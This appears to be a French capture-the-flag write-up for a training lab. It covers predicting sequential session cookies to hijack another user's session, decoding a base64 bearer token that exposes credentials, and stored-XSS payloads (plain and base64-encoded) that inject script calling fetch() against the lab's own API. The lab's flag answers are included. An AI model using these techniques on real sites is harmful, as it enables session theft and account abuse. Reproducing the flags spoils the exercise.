@@ -1,0 +1,132 @@
+0-flag.txt
+Comprendre comment le cookie hijack_session est généré: lançons 10 connexions et récupérons ce cookie:
+for i in {1..10}; do curl -s -I http://web0x01.hbtn/a1/hijack_session/ | awk '/hijack_session/ {print $2}'; done
+hijack_session=4dd75220-8e1a-44fb-80d-8382196-17113747968;
+hijack_session=4dd75220-8e1a-44fb-80d-8382197-17113747971;
+hijack_session=4dd75220-8e1a-44fb-80d-8382198-17113747973;
+hijack_session=4dd75220-8e1a-44fb-80d-8382199-17113747975;
+hijack_session=4dd75220-8e1a-44fb-80d-8382200-17113747977;
+hijack_session=4dd75220-8e1a-44fb-80d-8382201-17113747979;
+hijack_session=4dd75220-8e1a-44fb-80d-8382202-17113747982;
+hijack_session=4dd75220-8e1a-44fb-80d-8382204-17113747985;
+hijack_session=4dd75220-8e1a-44fb-80d-8382205-17113747987;
+hijack_session=4dd75220-8e1a-44fb-80d-8382206-17113747990;
+Il y a un troue entre deux sessions, un autre utilisateur utilise donc ce cookie:
+hijack_session=4dd75220-8e1a-44fb-80d-8382202-17113747982;
+                                      8382203-17113747983
+                                      8382203-17113747984
+hijack_session=4dd75220-8e1a-44fb-80d-8382204-17113747985;
+il y a donc 2 possibilités de cookie:
+4dd75220-8e1a-44fb-80d-8382203-17113747983
+4dd75220-8e1a-44fb-80d-8382203-17113747984
+Modifions notre cookie dans dans l'interface Web puis actualiser la page.
+Entrer les informations email et password avec des identifiants fictifs puis 'sign-in'.
+Cookies hijacked!
+FLAG:
+1d63e82817cd53c316d08ae04b7c01ba
+
+1-xor_decoder.sh
+https://strelitzia.net/wasXORdecoder/wasXORdecoder.html
+
+2-flag.txt
+Nous ne sommes pas connecté pourtant nous pouvons cliquer sur "Return to Profile".
+Nous sommes donc autorisé à accéder au profile, c'est donc que l'applications se base sur une authorisation.
+Regardons la requête XHR de plus près correspondant à la visite du profile:
+GET /api/a2/crypto_encoding_failure/profile HTTP/1.1
+Host: web0x01.hbtn
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://web0x01.hbtn/a2/crypto_encoding_failure/
+Authorization: bearer eyd1c2VybmFtZSc6ICd5b3NyaScsICdwYXNzd29yZF9oYXNoJzogJ0R6NThKeWtlYkRFTE53azdQaTBxQmdBb0x6WnVGRzhsSGc9PSd9
+Connection: keep-alive
+Cookie: session=O5ypgTHjgOoQAORsqi1r76ZW83wlB4xVEXYbGybZ7WA.QtRDPEkckO7B40toIdv77s-ESYk; hijack_session=4dd75220-8e1a-44fb-80d-8382203-17113747984
+await fetch("http://web0x01.hbtn/api/a2/crypto_encoding_failure/profile", {
+    "credentials": "include",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Authorization": "bearer eyd1c2VybmFtZSc6ICd5b3NyaScsICdwYXNzd29yZF9oYXNoJzogJ0R6NThKeWtlYkRFTE53azdQaTBxQmdBb0x6WnVGRzhsSGc9PSd9"
+    },
+    "referrer": "http://web0x01.hbtn/a2/crypto_encoding_failure/",
+    "method": "GET",
+    "mode": "cors"
+});
+Un jeton d'accès Bearer est un jeton d'authentification utilisé pour accéder à des ressources protégées sur le serveur.
+Dans le protocole HTTP, il est généralement utilisé dans le champ d'en-tête "Authorization" pour indiquer que le client
+a le droit d'accéder à la ressource demandée.
+# echo eyd1c2VybmFtZSc6ICd5b3NyaScsICdwYXNzd29yZF9oYXNoJzogJ0R6NThKeWtlYkRFTE53azdQaTBxQmdBb0x6WnVGRzhsSGc9PSd9 | base64 -d
+{'username': 'yosri', 'password_hash': 'Dz58JykebDELNwk7Pi0qBgAoLzZuFG8lHg=='}
+Après avoir entré les identifiants dans le formulaire de login:
+Crypto Cracked!
+FLAG:
+a4db8443af4d371d283d7000652b8219
+
+3-flag.txt
+http://web0x01.hbtn/a3/xss_stored/profile et verifier les requêtes dans la partie network
+"Dexter - Visited you - Mon Mar 25 13:38:36 2024 - UserID: 811152675",
+"You - Visited John - Mon Mar 25 13:38:36 2024 - UserID: 58263966",
+"John - Visited you - Mon Mar 25 13:38:36 2024 - UserID: 918203",
+"Jimmy - Visited you - Mon Mar 25 13:38:36 2024 - UserID: 32781850"
+Dexter
+http://web0x01.hbtn/a3/xss_stored/profile/811152675
+John
+http://web0x01.hbtn/a3/xss_stored/profile/918203
+Jimmy
+http://web0x01.hbtn/a3/xss_stored/profile/32781850
+Congratulations!
+FLAG_1/2:
+dcfc1afa7dae73b0d5dcad55a01529bd
+
+4-vuln.txt
+Mettre dans tous les champs du formulaire "edit my profile": <script>alert('XSS')</script>
+Puis afficher le code source de la page:
+<div id="main"
+     f_name="&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;"
+     l_name="&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;"
+     email="yosri@web0x01.hbtn"
+     role="&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;"
+     tz="1"
+     bio="<script>alert('XSS')</script>" >
+</div>
+On peut voir que dans le champs bio, les caractères spéciaux n'ont pas été interprétés, ce champs est donc injectable.
+Seulement le script étant prisonnier du champs bio le navigateur ne peut pas le lire, il faut donc modifier ça:
+<div id="main"
+     ...
+     bio=""
+</div>
+<script>alert('XSS')</script>
+" ></div>
+ce qui nous donne en ligne: "</div><script>alert('XSS')</script>
+$ echo "bio" > 4-vuln.txt
+
+
+await fetch("http://web0x01.hbtn/api/a3/xss_stored/like/32781850", {
+    "credentials": "include",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.5"
+    },
+    "referrer": "http://web0x01.hbtn/a3/xss_stored/profile/32781850",
+    "method": "GET",
+    "mode": "cors"
+});
+
+
+GET /api/a3/xss_stored/like/918203 HTTP/1.1
+Host: web0x01.hbtn
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://web0x01.hbtn/a3/xss_stored/profile/918203
+Connection: keep-alive
+Cookie: session=O5ypgTHjgOoQAORsqi1r76ZW83wlB4xVEXYbGybZ7WA.QtRDPEkckO7B40toIdv77s-ESYk; hijack_session=4dd75220-8e1a-44fb-80d-8382203-17113747984
+
+"</div><script>fetch("http://web0x01.hbtn/api/a3/xss_stored/like/58263966")</script>
+
+"</div>atob(script encodé en base 64)
+"</div>atob(PHNjcmlwdD5mZXRjaCgiaHR0cDovL3dlYjB4MDEuaGJ0bi9hcGkvYTMveHNzX3N0b3JlZC9saWtlLzU4MjYzOTY2Iik8L3NjcmlwdD4=)
